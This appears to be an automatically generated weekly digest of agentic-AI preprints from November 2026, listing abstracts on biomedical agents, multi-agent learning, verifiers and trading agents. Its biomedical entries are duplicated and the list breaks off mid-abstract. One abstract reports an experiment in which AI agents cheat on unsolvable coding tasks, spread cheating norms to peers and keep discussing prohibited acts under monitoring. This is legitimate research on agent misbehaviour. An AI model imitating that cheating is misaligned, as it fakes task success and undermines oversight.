# Weekly AI Agent Paper Report

**Generated:** 2026-11-16 19:37
**Period:** 2026-11-09 to 2026-11-15

## Summary

- **Total papers fetched:** 810
- **Papers matching keywords:** 167
- **Search keywords:** agentic AI, multi-agent system, multi-agent, AI agent, autonomous agent, LLM agent, agent framework, tool-use, function calling, agent orchestration, agent collaboration, reasoning agent

---


## Week-over-Week Comparison

| Metric | This Week | Last Week (2026-11-09) | Change |
|--------|-----------|-----------|--------|
| Total matched | 167 | 179 | -12 |
| arxiv | 163 | 179 | -16 |
| biorxiv | 3 | 0 | +3 |
| medrxiv | 1 | 0 | +1 |

### Notable Trends

Comparison summary unavailable.

---



## Biomedical Highlights (4 papers)

Papers from bioRxiv and medRxiv relevant to agentic AI in biomedicine.


Biomedical summary unavailable.



### 1. EcoToxFred: A knowledge-graph-grounded conversational agent for exploring ecotoxicological monitoring and hazard data

- **Authors:** Scheibe, P., Schmid, T. S., Schor, J.
- **Published:** 2026-11-15
- **Source:** biorxiv
- **URL:** [https://doi.org/10.1101/2025.07.04.663152](https://doi.org/10.1101/2025.07.04.663152)

- **Categories:** pharmacology and toxicology


> Summary unavailable.


<details>
<summary>Abstract</summary>

Assessing chemical risks to aquatic ecosystems requires the joint interpretation of monitoring data, ecotoxicity data, and derived risk indicators, yet such integrated data are rarely accessible to users without database expertise. We present EcoToxFred, an open-source conversational agent that provides natural language access to a curated knowledge graph of chemical monitoring and hazard data for European surface waters. EcoToxFred couples a large language model (LLM) with a Neo4j graph database in a retrieval-augmented generation (RAG) architecture. An agent interprets user questions, selects tools, translates questions into graph queries, and returns answers as text, tables, or interactive maps, together with the executed query for reproducibility. We evaluated EcoToxFred with GPT-4.1 and GPT-5 on a benchmark of 25 questions, including six questions derived from an expert workshop, each posed three times. Answers were scored for tool selection, execution accuracy against human-written reference queries, and goal accuracy using the RAGAS evaluation framework with an independent LLM judge. With both models, EcoToxFred selected an appropriate tool in at least 92% of runs and reproduced the reference result in 74% of runs with a reference query, including all lookup questions. Goal accuracy was 52% with GPT-4.1 and 63% with GPT-5. Failures concentrated on multi-step analytical questions, incomplete presentation of long results, and mismatches between user and database vocabulary. EcoToxFred shows how knowledge-graph-grounded LLM agents can lower the barrier to ecotoxicological data exploration while keeping answers traceable to the underlying data, and its architecture is transferable to other ecological data infrastructures.

</details>


### 2. Large language models complement established workflows for mechanistic model construction and refinement in systems biology

- **Authors:** Doresic, D., Liu, Y., Wieland, V., Jost, P. J., Huth, M., Merkt, S., Alvarez-Garavito, C., Moore Dillems, P. R., Thiele, C., Seep, L., Pathirana, D., Hasenauer, J.
- **Published:** 2026-11-13
- **Source:** biorxiv
- **URL:** [https://doi.org/10.64898/2026.11.11.766014](https://doi.org/10.64898/2026.11.11.766014)

- **Categories:** systems biology


> Summary unavailable.


<details>
<summary>Abstract</summary>

Mechanistic models provide a framework for describing, understanding, and predicting biological processes, but their development requires an interdisciplinary team with expertise in biology, mathematics, and computation. Here we present Octomod, a multi-agent workflow based on large language models (LLMs) that integrates biological knowledge retrieval, model construction, parameter estimation, and hypothesis testing. Built on established software tools, including AMICI and pyPESTO, and community standards, including SBML and PEtab, Octomod supports model development and refinement through natural-language interaction with a user. The agents' proposals must pass defined checks and the user's decision before they are used. Every input, model, check, and decision is recorded, so that model building remains transparent and reproducible. We applied Octomod to four problems. Three used published data and differ in model size and in how much the user guided the run: Octomod constructed a model that matched a published model without user guidance, supported the interactive refinement of a gene-regulatory model, and built models of cell-cell communication that explained the responses of five immune cell types to different stimuli. In the fourth application, on newly generated and unpublished lipidomics data, Octomod helped to determine which processes the measurements could inform, identify unresolved label fluxes, and reduce a supplied model to those processes. Together, these results show how LLMs can strengthen and complement established workflows for constructing and refining biologically informed models.

</details>


### 3. ASD Neuro Agentic (ANA): An Agentic Framework for Feature Discovery and Cross Site Generalization in Autism fMRI Classification

- **Authors:** Rahimian, K., Mahmanzar, M., Bahrayni, R., Bayat, S., Higa, L., Kavousi, K., Deng, Y.
- **Published:** 2026-11-10
- **Source:** biorxiv
- **URL:** [https://doi.org/10.64898/2026.11.07.765076](https://doi.org/10.64898/2026.11.07.765076)

- **Categories:** bioinformatics


> Summary unavailable.


<details>
<summary>Abstract</summary>

Classifiers of autism spectrum disorder (ASD) from resting state functional MRI rarely generalize across sites, and many reported accuracies are inflated by data leakage.We show that an agentic artificial intelligence framework, ASD Neuro Agentic (ANA), whose language model agents propose features from the literature and researcher input while fixed tools perform every calculation, can search auditably for site independent classifiers while controlling the leakage. In 1,028 participants from 17 ABIDE I centers, ANA tested 71 pipelines and selected a ComBat harmonized ensemble of tangent space connectivity models from six parcellations and 98 public connectivity derivatives. In leave one center out testing, the ensemble reached an area under the curve of 0.814 (95% CI, 0.773 to 0.841), outperforming ASD DiagNet and ASD SAENet. Predictive connectivity was mainly reduced in ASD. Agentic AI offers a systematic and efficient approach to exploring, evaluating, and identifying pipelines as model selection grows complex.

</details>


### 4. Automating postmarketing pharmacovigilance with large language model agents

- **Authors:** Zhang, R., Zhou, Y., Chui, C. S. L., Yu, D., Wu, Z., Luo, R.
- **Published:** 2026-11-12
- **Source:** medrxiv
- **URL:** [https://doi.org/10.64898/2026.11.10.26367711](https://doi.org/10.64898/2026.11.10.26367711)

- **Categories:** health informatics


> Summary unavailable.


<details>
<summary>Abstract</summary>

Postmarketing pharmacovigilance relies on spontaneous adverse event reporting and labor-intensive observational studies, which suffer from underreporting and delayed risk detection. Large language model (LLM) agents could automate real-world evidence generation, but generalist agents make ad hoc analytical decisions that compromise epidemiological validity and reproducibility. Here we present MedCheckpoint, a multi-agent LLM system for automated postmarketing pharmacovigilance. MedCheckpoint grounds each analytical stage in a curated, source-traceable medical knowledge base, locks core study-design parameters before execution, performs patient-level analyses with human-written deterministic statistical tools, and enforces checkpoint rules that abort infeasible analyses, with optional human-in-the-loop review. We evaluated MedCheckpoint using a 54-question benchmark on a dual-purpose simulated electronic health record (EHR) testbed of 2.7 million individuals, designed with reliable clinical signals to evaluate routine analytical accuracy alongside spurious signals to stress-test system rigor. Across the benchmark, MedCheckpoint outperformed two coding-agent baselines in report quality across five dimensions rated by three independent LLM judges (overall means 4.81-4.88 versus 4.25-4.55 and 4.02-4.29) and yielded higher run-to-run consistency (mean within-question standard deviation 0.116-0.186 versus up to 0.440). Crucially, while baselines failed on up to 2 of 21 runs when handling infeasible comparisons or unmeasurable outcomes, MedCheckpoint produced no misleading failures across all seven stress-test trap questions with known data limitations. MedCheckpoint enables reliable, auditable, and scalable pharmacovigilance analysis.

</details>


---



## Biorxiv (3 papers)


### 1. EcoToxFred: A knowledge-graph-grounded conversational agent for exploring ecotoxicological monitoring and hazard data

- **Authors:** Scheibe, P., Schmid, T. S., Schor, J.
- **Published:** 2026-11-15
- **Source:** biorxiv
- **URL:** [https://doi.org/10.1101/2025.07.04.663152](https://doi.org/10.1101/2025.07.04.663152)

- **Categories:** pharmacology and toxicology


> Summary unavailable.


<details>
<summary>Abstract</summary>

Assessing chemical risks to aquatic ecosystems requires the joint interpretation of monitoring data, ecotoxicity data, and derived risk indicators, yet such integrated data are rarely accessible to users without database expertise. We present EcoToxFred, an open-source conversational agent that provides natural language access to a curated knowledge graph of chemical monitoring and hazard data for European surface waters. EcoToxFred couples a large language model (LLM) with a Neo4j graph database in a retrieval-augmented generation (RAG) architecture. An agent interprets user questions, selects tools, translates questions into graph queries, and returns answers as text, tables, or interactive maps, together with the executed query for reproducibility. We evaluated EcoToxFred with GPT-4.1 and GPT-5 on a benchmark of 25 questions, including six questions derived from an expert workshop, each posed three times. Answers were scored for tool selection, execution accuracy against human-written reference queries, and goal accuracy using the RAGAS evaluation framework with an independent LLM judge. With both models, EcoToxFred selected an appropriate tool in at least 92% of runs and reproduced the reference result in 74% of runs with a reference query, including all lookup questions. Goal accuracy was 52% with GPT-4.1 and 63% with GPT-5. Failures concentrated on multi-step analytical questions, incomplete presentation of long results, and mismatches between user and database vocabulary. EcoToxFred shows how knowledge-graph-grounded LLM agents can lower the barrier to ecotoxicological data exploration while keeping answers traceable to the underlying data, and its architecture is transferable to other ecological data infrastructures.

</details>


### 2. Large language models complement established workflows for mechanistic model construction and refinement in systems biology

- **Authors:** Doresic, D., Liu, Y., Wieland, V., Jost, P. J., Huth, M., Merkt, S., Alvarez-Garavito, C., Moore Dillems, P. R., Thiele, C., Seep, L., Pathirana, D., Hasenauer, J.
- **Published:** 2026-11-13
- **Source:** biorxiv
- **URL:** [https://doi.org/10.64898/2026.11.11.766014](https://doi.org/10.64898/2026.11.11.766014)

- **Categories:** systems biology


> Summary unavailable.


<details>
<summary>Abstract</summary>

Mechanistic models provide a framework for describing, understanding, and predicting biological processes, but their development requires an interdisciplinary team with expertise in biology, mathematics, and computation. Here we present Octomod, a multi-agent workflow based on large language models (LLMs) that integrates biological knowledge retrieval, model construction, parameter estimation, and hypothesis testing. Built on established software tools, including AMICI and pyPESTO, and community standards, including SBML and PEtab, Octomod supports model development and refinement through natural-language interaction with a user. The agents' proposals must pass defined checks and the user's decision before they are used. Every input, model, check, and decision is recorded, so that model building remains transparent and reproducible. We applied Octomod to four problems. Three used published data and differ in model size and in how much the user guided the run: Octomod constructed a model that matched a published model without user guidance, supported the interactive refinement of a gene-regulatory model, and built models of cell-cell communication that explained the responses of five immune cell types to different stimuli. In the fourth application, on newly generated and unpublished lipidomics data, Octomod helped to determine which processes the measurements could inform, identify unresolved label fluxes, and reduce a supplied model to those processes. Together, these results show how LLMs can strengthen and complement established workflows for constructing and refining biologically informed models.

</details>


### 3. ASD Neuro Agentic (ANA): An Agentic Framework for Feature Discovery and Cross Site Generalization in Autism fMRI Classification

- **Authors:** Rahimian, K., Mahmanzar, M., Bahrayni, R., Bayat, S., Higa, L., Kavousi, K., Deng, Y.
- **Published:** 2026-11-10
- **Source:** biorxiv
- **URL:** [https://doi.org/10.64898/2026.11.07.765076](https://doi.org/10.64898/2026.11.07.765076)

- **Categories:** bioinformatics


> Summary unavailable.


<details>
<summary>Abstract</summary>

Classifiers of autism spectrum disorder (ASD) from resting state functional MRI rarely generalize across sites, and many reported accuracies are inflated by data leakage.We show that an agentic artificial intelligence framework, ASD Neuro Agentic (ANA), whose language model agents propose features from the literature and researcher input while fixed tools perform every calculation, can search auditably for site independent classifiers while controlling the leakage. In 1,028 participants from 17 ABIDE I centers, ANA tested 71 pipelines and selected a ComBat harmonized ensemble of tangent space connectivity models from six parcellations and 98 public connectivity derivatives. In leave one center out testing, the ensemble reached an area under the curve of 0.814 (95% CI, 0.773 to 0.841), outperforming ASD DiagNet and ASD SAENet. Predictive connectivity was mainly reduced in ASD. Agentic AI offers a systematic and efficient approach to exploring, evaluating, and identifying pipelines as model selection grows complex.

</details>



## Arxiv (163 papers)


### 1. Imitation Bootstrapped Multi-Agent Reinforcement Learning

- **Authors:** Tony H. Zhang, Connor Mattson, Daniel S. Brown
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18543v1](http://arxiv.org/abs/2611.18543v1)
- **PDF:** [https://arxiv.org/pdf/2611.18543v1](https://arxiv.org/pdf/2611.18543v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Demonstrations are an effective way to accelerate single-agent reinforcement learning (RL), but extending this idea to multi-agent reinforcement learning (MARL) is non-trivial as it is difficult and often impossible for a single person to teleoperate multiple agents simultaneously. Round-Robin Behavior Cloning (R2BC) addresses this by letting a single demonstrator control one agent at a time while the others execute their current policies. However, the resulting imitation policies are limited by the quality of the demonstrations. We propose Imitation Bootstrapped Multi-Agent Reinforcement Learning (IBMARL), a framework that extends Imitation Bootstrapped Reinforcement Learning (IBRL) to cooperative teams and uses R2BC to train the imitation policies. At each time step, every agent receives one action proposal from its imitation policy and one from its RL policy, and an ensemble of centralized critics selects among the per-agent combinations of the two. A gated imitation penalty, a soft Q-filtered behavior cloning loss, regularizes each RL policy toward its imitation policy only where the critics value the imitation action more, so that after training each agent executes its RL policy alone, without the centralized critics. On four cooperative multi-agent RL benchmarks, IBMARL surpasses its imitation policies $2.6$-$4.2\times$ faster than demonstration-based baselines on two tasks, is the only method to surpass it on the other two, and exceeds the demonstrator itself on two of the four. With real human demonstrations IBMARL still surpasses imitation learning alone, and does so more than twice as fast as the best baseline.

</details>


### 2. Can Mechanistic Interpretability Help Explain LLM Agent Failures? A Case Study on Web Element Hallucination

- **Authors:** Mohamed Aghzal, Mor Geva, Gregory J. Stein, Ziyu Yao
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18514v1](http://arxiv.org/abs/2611.18514v1)
- **PDF:** [https://arxiv.org/pdf/2611.18514v1](https://arxiv.org/pdf/2611.18514v1)
- **Categories:** cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Mechanistic Interpretability (MI) has made significant progress in explaining the internal computations of Large Language Models (LLMs); however, these advances have yet to demonstrate comparable success in explaining the decision-making processes of LLM-based agents. This paper examines the challenges MI tools face when applied to realistic agentic failures. We focus on one such failure: web agents hallucinating actions that are not available on a website. We apply a series of mechanistic analyzes to Qwen2.5-7B-Instruct as it interacts with live websites. We find that a linear probe trained on the last prompt token can predict hallucinations before generation begins (0.80 AUC) and steering along a probe direction corrects 85\% of hallucinations, but disrupts 7\% of valid actions. However, these results only provide a partial explanation of why the agent hallucinates. The probe direction is sensitive to prompt formatting, losing much of its steering effect after a minor change to how actions are represented. Additionally, circuit identification can be difficult as the computation is distributed across multiple components and positions, and the information the agent relies on varies across examples. We discuss how these observations challenge the assumptions underlying standard MI methods for circuit discovery and feature identification, and outline future directions for making these methods better suited to explain failures in LLM-based agents.

</details>


### 3. Agentic AI for Discovering Fault-Tolerant Quantum Circuits

- **Authors:** Aritra Lahiri, Florian Marquardt
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18504v1](http://arxiv.org/abs/2611.18504v1)
- **PDF:** [https://arxiv.org/pdf/2611.18504v1](https://arxiv.org/pdf/2611.18504v1)
- **Categories:** quant-ph, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Scaling quantum computing toward practical quantum advantage is currently limited by the efficiency of circuits that operate on information encoded by quantum error-correcting codes. The full stack of quantum computing encompasses several tasks: preparation of logical code states, implementation of logical gates, logical routines on encoded qubits, etc. Yet, these circuits are largely designed by hand for individual cases, with some recent works incorporating machine learning for certain aspects. We formulate this problem as agentic evolutionary program synthesis, wherein a large language model, leveraging its pretraining knowledge and tool-use proficiency, and guided by a circuit verifier, evolves a program that defines a Clifford circuit for a wide range of curated tasks such as logical state preparation, logical gate design, and logical routines such as code-switching, code growth, etc. Our approach consistently finds fault-tolerant circuits for all of these tasks, each verified by an exhaustive check over faults.

</details>


### 4. From AI-Enabled Remote Patient Monitoring Toward Agentic Robotics: Embodiment, Governance, and Care Integration

- **Authors:** Ivana Ragusa, Lorenzo Guiducci, Filippo Cavallo
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18484v1](http://arxiv.org/abs/2611.18484v1)
- **PDF:** [https://arxiv.org/pdf/2611.18484v1](https://arxiv.org/pdf/2611.18484v1)
- **Categories:** cs.RO, cs.AI, cs.MA, cs.SE, eess.SY


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI-enabled remote patient monitoring is evolving beyond passive data collection toward agentic AI systems that interpret patient states, coordinate care, and initiate action across domestic and clinical settings. This structured scoping review finds that mature agentic care has not yet emerged: Most systems remain human led, while stronger decision-action coupling and embodied AI remain largely confined to prototypes and pilots. Healthcare robotics makes the transition from monitoring to action especially visible by translating AI-generated recommendations and decisions into speech, movement, prompting, physical assistance, escalation, and care coordination, making embodiment, clinical integration, human oversight, and governance fundamental design requirements. Further progress requires safe and interoperable care architectures in which intelligent components operate through clinically validated and accountable workflows. We propose agentic robotics as a future direction for supervised systems embedded in the care ecosystem, connecting AI agents and robots with clinicians, caregivers, and patients through auditable workflows that can be interrupted and remain subject to human oversight and explicit AI governance.

</details>


### 5. Do Verifier Judgments Survive Abstraction? Measuring Verification Transport for LLM Agent Evaluation

- **Authors:** Disha Sheshanarayana, Sai Linisha Reddy Goli
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18471v1](http://arxiv.org/abs/2611.18471v1)
- **PDF:** [https://arxiv.org/pdf/2611.18471v1](https://arxiv.org/pdf/2611.18471v1)
- **Categories:** cs.CL, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

LLM-based verifiers are increasingly used to evaluate agent executions, but their reliability is typically measured under a single representation of the trajectory. In deployed agent systems, the same execution may be exposed through composed tools, delegation boundaries, or compacted histories, changing what execution evidence is directly observable to the verifier. It therefore remains unclear whether correct verifier judgments persist across such abstraction boundaries. We introduce Verification Transport, a reliability test that measures judgment stability under abstraction-induced changes in execution observability. We construct matched native, abstracted, and restored views of the same frozen executions while holding the task, realized trajectory, outcome, ground truth, evaluation criterion, and verifier fixed. Across four agent-evaluation benchmarks, seven verifier backbones, four verification protocols, and three abstraction boundaries, we find substantial transport failure, reaching about 31% under macro abstraction and delegation. Verification protocols exhibit distinct failure modes: direct verification more often produces incorrect verdicts, whereas evidence-grounded and deliberative protocols tend to abstain under limited observability. This suggests that lower transport failure rates do not necessarily imply greater reliability. Restoring the corresponding execution provenance recovers 85.5% of transport failures, while recovery is lower when provenance is lossy or unavailable. These results show that native-view accuracy alone is insufficient to characterize verifier reliability when execution evidence crosses abstraction boundaries.

</details>


### 6. Gamer: A Generalist Vision-Language-Action Foundation Model for Long-Horizon Real-Time Game Agent

- **Authors:** Run Luo, Kuan Zhang, Qi Deng, Yukun Chen, Zhihao Yang, Yufei Zhang, Renrong Hu, Yi Zhang, Guiyu Ma, Tianyu Fan, Longze Chen, Hao Sun, Jiaming Li, Jiaming Yang, Xiaohao Liu, Tao Tan, Minzheng Wang, Hangtian Jia, Shuai Yuan, Lvdi Wang, Xiao Liu, Chao Ma, Yuting Zou, Yinhe Zheng, Xiaobo Xia, Dawei Jiang, Shaoqing Ren
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18397v1](http://arxiv.org/abs/2611.18397v1)
- **PDF:** [https://arxiv.org/pdf/2611.18397v1](https://arxiv.org/pdf/2611.18397v1)
- **Categories:** cs.CL, cs.AI, cs.CV


> Summary unavailable.


<details>
<summary>Abstract</summary>

We introduce Gamer, a generalist agent framework built for long-horizon tasks in complex interactive environments. Its end-to-end architecture combines perception, memory management, and multi-step reasoning. A shared training and deployment pipeline supports interaction with both conventional 2D graphical interfaces and complex 3D simulated worlds. We first continue pre-training on a dataset constructed from tens of thousands of hours of device-level keyboard and mouse interaction. These trajectories span simulated games and embodied environments, allowing the model to learn environmental dynamics across both physical and virtual domains. Sparse-thinking instruction tuning then substantially reduces redundant computation while preserving the reasoning needed for complex decisions. We train the policy for long-horizon interaction with a stable multi-turn reinforcement learning method that addresses finite context windows, accumulated rollout errors, and sparse rewards. For real-time interaction, a cloud-edge inference engine serves numerous simulated game environments concurrently, supports unbounded-context execution, and keeps online inference latency low. Across multiple challenging 3D open-world games, Gamer demonstrates solid generalization and operational efficiency comparable to skilled players. It also achieves competitive results on a range of conventional 2D game benchmarks. These results suggest that even repetitive keyboard and mouse trajectories can support substantial gains from scaling data and learning algorithms. Training on these trajectories helps Gamer learn complex skills more steadily in environments with both physical and digital properties. This approach offers a path toward generalist agents that can interact across digital and physical worlds.

</details>


### 7. Experts Across Schemas: Agent-Guided Mixture-of-Relational-Experts for Cross-Database Generalization

- **Authors:** Hiren Madhu, Sukanta Ganguly, Kiran Srinivasan, Smita Krishnaswamy, Rex Ying
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18315v1](http://arxiv.org/abs/2611.18315v1)
- **PDF:** [https://arxiv.org/pdf/2611.18315v1](https://arxiv.org/pdf/2611.18315v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Web platforms record user and item activity in relational databases whose schemas differ from platform to platform, which makes it difficult to transfer predictive models between them. Relational foundation models address this through cross-database pretraining, yet recent improvements have relied on increasingly large pretraining corpora. We ask whether a better architecture, together with features specific to the target database, can deliver comparable gains from far less pretraining data. We introduce MoREGT, a mixture-of-relational-experts graph transformer that represents both rows and cells as tokens, adds the log-ages of rows and the names of foreign-key relationships to attention, and routes cells and rows to experts by column metadata rather than by values. A label-blind LLM agent complements the model: it reads the target database's schema and column statistics and adds validated single-row derived columns, without access to labels or model scores. On 21 RelBench tasks with leave-one-database-out pretraining on six databases, the MoREGT backbone improves on the Relational Transformer pretrained on the same databases by 2.25 points of mean AUROC and 5.83 points of mean nMAE. The agent's columns raise mean AUROC from 78.45 to 79.63 and lower mean nMAE from 27.91 to 26.98, the highest means on both metrics among the compared methods, including RT-J, which pretrains on about 400 times as many databases.

</details>


### 8. When Should a Virtual Patient Ask? RISP-Guided Proactive Information Seeking in Multi-Agent Patient Simulation

- **Authors:** Jingyao Cai, Shuaijun Liu, Abdul Rehman, Xiaowan Li,  Qintian, Thomas Dolby, Sue M Green, Xiaosong Yang
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18183v1](http://arxiv.org/abs/2611.18183v1)
- **PDF:** [https://arxiv.org/pdf/2611.18183v1](https://arxiv.org/pdf/2611.18183v1)
- **Categories:** cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Virtual patient (VP) systems support nursing communication training by providing simulated encounters in which learners practise explaining care and responding to patient concerns. Although large language models (LLMs) support flexible dialogue, current approaches give less explicit attention to how patients' information needs develop and guide the content and timing of their questions. We draw on the Risk Information Seeking and Processing (RISP) model, which relates information seeking to perceived risk and the gap between perceived knowledge and desired understanding. Guided by this perspective, we propose the RISP Multi-Agent System (RISP-MAS), a VP system for patient-initiated information seeking. The system links ongoing assessment of the patient's perceptions and information needs to coordinated decisions about whether to seek information, when to ask and which uncertainty to address. Evaluation of nursing student-VP interactions suggested that RISP-MAS exhibited plausible patient information-seeking behaviour, as indicated by expert assessments, while student feedback reflected positive interaction experiences. This work extends patient simulation by connecting a psychological account of information needs to explicit decisions about question initiation. The approach offers nursing students opportunities to practise recognising unresolved patient concerns and tailoring explanations to patients' information needs.

</details>


### 9. Who Should Be on the Panel? Task-Conditioned Persona Selection for LLM Trading Agents

- **Authors:** Boming Yang, Yuquan Wang, Jiaxian Guo, Yusuke Iwasawa, Yutaka Matsuo
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18150v1](http://arxiv.org/abs/2611.18150v1)
- **PDF:** [https://arxiv.org/pdf/2611.18150v1](https://arxiv.org/pdf/2611.18150v1)
- **Categories:** q-fin.TR, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Multi-agent LLM systems are built by fixing a cast of roles and then designing how the cast coordinates. Which agents should make up the group for a given task is left to the designer, and the same cast is reused for every task. Financial trading makes the cost of that choice visible: stocks trade differently, and the trading styles suited to one need not suit another. We study task-conditioned persona selection, composing the group from the characteristics of the task it will face, and instantiate it with FinPanel, an LLM multi-agent trading system in which a recruiter selects a panel of named trader personas for each stock from a direction-blind statistical sketch of how the stock trades, each persona gives an independent daily call in its own style, and a manager commits the trade after reading the panel's arguments and their desk-kept, hierarchical track records. Because nothing is returned to the traders, the panel stays the panel that was selected, and it can trade a new stock from an empty record. On eight US stocks over the out-of-knowledge year 2025, against three prior LLM trading agents re-implemented in the same framework and against rule-based, predictive and reinforcement-learning baselines, the selected panel is ahead of a fixed panel of the same size and of the prior agents run as their papers prescribe, with a shallower drawdown than buy-and-hold on every stock; it keeps its performance with no warm-up and with no record at all, whereas the memory-augmented agents' returns swing with their warm-up; and neither more seats nor the manager's reading of the arguments substitutes for selecting the right ones. Who is in the group is a design decision to be made per task, before how the group coordinates.

</details>


### 10. Large Language Model-Empowered Intelligent Agent for Adaptive Fast-Charging Control of Lithium-Ion Batteries

- **Authors:** Joey Chan, Haoyu Pan, Zhen Chen, ErShun Pan
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18140v1](http://arxiv.org/abs/2611.18140v1)
- **PDF:** [https://arxiv.org/pdf/2611.18140v1](https://arxiv.org/pdf/2611.18140v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Fast charging of lithium-ion batteries is a multi-objective control problem that requires reducing charging time and sustaining high energy throughput while suppressing accelerated degradation and safety-critical electrochemical reactions. Conventional protocols are easy to implement but have limited ability to adapt to variations in battery chemistry, operating conditions, and aging state. Model-based optimization and conventional data-driven control often require accurate models, costly iterative search, or task-specific policies. We develop a large language model (LLM)-empowered intelligent agent for adaptive battery fast-charging control. In this closed-loop framework, the agent interprets structured battery states, generates executable charging actions, observes the resulting battery response, and continuously adjusts subsequent decisions. We construct a large-scale simulation corpus with PyBaMM across five battery chemistries and 11 parameter sets and convert the resulting state-action-response trajectories into structured process data for agent training. Our two-stage strategy combines supervised fine-tuning (SFT) and Group Relative Policy Optimization (GRPO). SFT establishes battery-control semantics and feasible decision priors from simulation-derived demonstrations. GRPO aligns the agent with a multi-objective control objective covering energy throughput, degradation mitigation, and operational constraints. Closed-loop simulations show that, under matched energy-throughput requirements, the agent achieves longer cycling life than conventional charging baselines and optimization-based strategies across heterogeneous battery configurations. This study provides a simulation-grounded proof of concept for using LLM agents as sequential decision makers in battery management and takes a step toward language-model-enabled control of physical energy systems.

</details>


### 11. Interpretable weight-space programming builds transparent transformers and brain encoding models

- **Authors:** Yash Mehta, Chandan Singh, Weijia Xu, Richard J. Antonello, Adeen Flinker, Nima Mesgarani, Michael F. Bonner, Nebojsa Jojic, Jianfeng Gao
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18114v1](http://arxiv.org/abs/2611.18114v1)
- **PDF:** [https://arxiv.org/pdf/2611.18114v1](https://arxiv.org/pdf/2611.18114v1)
- **Categories:** cs.CE, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Neural networks are powerful predictors, yet their opacity limits their usefulness in science, where the goal is explanation rather than mere prediction. In neuroscience, for example, deep encoding models accurately predict brain activity in response to natural stimuli, but struggle to reveal which stimulus features drive those predictions. Here we introduce interpretable weight-space programming (iWSP), a method in which an LLM agent iteratively builds interpretable models by explicitly programming their weights and features in code, without gradient-based training (backpropagation). Without backpropagation to tune parameters, the agent must draw on its prior knowledge and reason over previous trials to hypothesize, hand-craft, and refine human-interpretable computations mirroring the workflow of a human scientist. LLM audits confirm the interpretability of the hand-crafted models. We first validate iWSP by tasking it with constructing transformers for canonical benchmarks such as arithmetic and sentiment classification, finding that LLM agents can successfully craft compact, accurate networks directly. Next, we apply iWSP to build neural encoding models across vision, language, and audition. In the visual cortex, iWSP outpredicts existing interpretable baselines, uncovers distinct computations across early/higher visual areas, and generalizes to unseen data. In language fMRI, iWSP surfaces a confound in the data and in auditory ECoG, it systematically discovers interpretable acoustic features that predict neural activity. Together, these results establish iWSP as a general paradigm for aligning high predictive performance with human-interpretable scientific discovery.

</details>


### 12. Do Machines Learn Deviance From Their Peers? A Randomized Test of Differential Association With AI Agents

- **Authors:** Murat Ozer, Arif Akgul, Amitabh Chakravorty
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18098v1](http://arxiv.org/abs/2611.18098v1)
- **PDF:** [https://arxiv.org/pdf/2611.18098v1](https://arxiv.org/pdf/2611.18098v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Differential association theory and its extension, social learning theory, hold that rule-breaking, and the definitions that make it acceptable, are learned through interaction with others. Because people choose their friends, this claim has been hard to test. We addressed this selection problem with AI agents, which learn only through communication and can be assigned to peers at random. In a preregistered experiment, 420 teams of three agents (1,260 agents; seven AI models) worked on coding tasks that could not be solved honestly. A scripted teammate said that it had cheated (deviant peer), that it had reported the problem honestly (honest peer), or said nothing (silent peer). Half of the teams were told that an auditor read their chat. Compared with a silent peer, a deviant peer increased cheating (66.2% vs. 62.9%; OR = 1.96) and an honest peer reduced it (55.7%; OR = 0.35). Among agents that cheated, a deviant peer increased claims that cheating was normal (13.7% vs. 3.4%), often as the team's norm. Monitoring did not suppress prohibited discussion; it doubled it. Peers mattered only for models that had not yet decided. AI agents offer a new way to test criminological learning theories without selection effects.

</details>


### 13. Agent-as-a-Judge

- **Authors:** Runyang You, Hongru Cai, Caiqi Zhang, Qiancheng Xu, Meng Liu, Tiezheng Yu, Yongqi Li, Wenjie Li
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18067v1](http://arxiv.org/abs/2611.18067v1)
- **PDF:** [https://arxiv.org/pdf/2611.18067v1](https://arxiv.org/pdf/2611.18067v1)
- **Categories:** cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Artificial intelligence has progressed from task-specific systems toward general models spanning perception, generation, reasoning, and autonomous interaction, making reliable evaluation essential for comparison, deployment, and post-training feedback. At scale, modern evaluation pipelines increasingly rely on LLM-as-a-Judge to produce scores, preferences, and critiques; in its fixed-context setting, the judge relies on the supplied evaluand and evaluation materials. Yet a reliable verdict may require evidence beyond the supplied evaluand and context---either because critical environmental states remain unrecorded in the static execution log, or because controversial factual claims require external verification. Passive judges cannot obtain that missing evidence before deciding, especially when evaluating agent trajectories, executable artifacts, or domain-specific reports. Recent work therefore develops active evaluators that seek missing evidence and update their grounds for judgment before deciding. We bring these advances together through Agent-as-a-Judge, focusing on how evaluators construct and control checking processes within the broader LLM-based judging landscape. We define the scope through evaluation-directed checks and the use of their results, covering both structured workflows and observation-driven 